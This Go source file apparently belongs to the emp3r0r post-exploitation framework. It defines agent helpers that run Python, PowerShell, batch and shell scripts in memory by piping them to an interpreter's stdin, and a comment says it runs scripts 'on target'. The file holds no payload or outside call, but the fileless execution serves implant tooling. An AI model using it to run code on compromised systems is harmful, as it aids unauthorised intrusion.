package agentutils

import (
	"bytes"
	"fmt"
	"io"
	"os/exec"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func feedScriptToStdin(cmd *exec.Cmd, scriptBytes []byte) (output string, err error) {
	stdoutBuf := &bytes.Buffer{}
	stderrBuf := &bytes.Buffer{}
	cmd.Stdout = stdoutBuf
	cmd.Stderr = stderrBuf
	shell := cmd.Args

	stdin, err := cmd.StdinPipe()
	if err != nil {
		err = fmt.Errorf("error creating StdinPipe for Cmd %s: %s", shell, err)
		return
	}

	collect_output := func() error {
		stdoutBytes := stdoutBuf.Bytes()
		stderrBytes := stderrBuf.Bytes()
		var outputError error
		output = string(stdoutBytes) + string(stderrBytes)
		if len(stderrBytes) > 0 {
			outputError = fmt.Errorf("error output from Cmd %s: %s", shell, stderrBytes)
		}

		return outputError
	}
	defer collect_output()

	if err = cmd.Start(); err != nil {
		err = fmt.Errorf("error starting Cmd %s: %s: %v", shell, err, collect_output())
		return
	}

	go func() {
		io.Copy(stdin, bytes.NewReader(scriptBytes))
		defer stdin.Close()
	}()
	if err = cmd.Wait(); err != nil {
		err = fmt.Errorf("error waiting for Cmd %s: %s: %v", shell, err, collect_output())
		return
	}

	return
}

// RunPythonScript runs a Python script in memory and returns the output.
func RunPythonScript(scriptBytes []byte, args []string) (output string, err error) {
	cmd := exec.Command("python")
	cmd.Env = args
	return feedScriptToStdin(cmd, scriptBytes)
}

// RunPSScript runs powershell script on windows
func RunPSScript(scriptBytes []byte, args []string) (output string, err error) {
	shell := "powershell.exe"

	cmd := exec.Command(shell, "-Command", "-")
	cmd.Env = args

	return feedScriptToStdin(cmd, scriptBytes)
}

// RunBatchScript runs batch script on windows
func RunBatchScript(scriptBytes []byte, args []string) (output string, err error) {
	shell := "cmd.exe"

	cmd := exec.Command(shell)
	cmd.Env = args

	return feedScriptToStdin(cmd, scriptBytes)
}

// RunShellScript runs a bash script on target
func RunShellScript(scriptBytes []byte, args []string) (output string, err error) {
	shell := def.DefaultShell
	if !util.IsFileExist(shell) {
		return "", fmt.Errorf("shell not found: %s", shell)
	}

	cmd := exec.Command(shell)
	cmd.Env = args
	return feedScriptToStdin(cmd, scriptBytes)
}
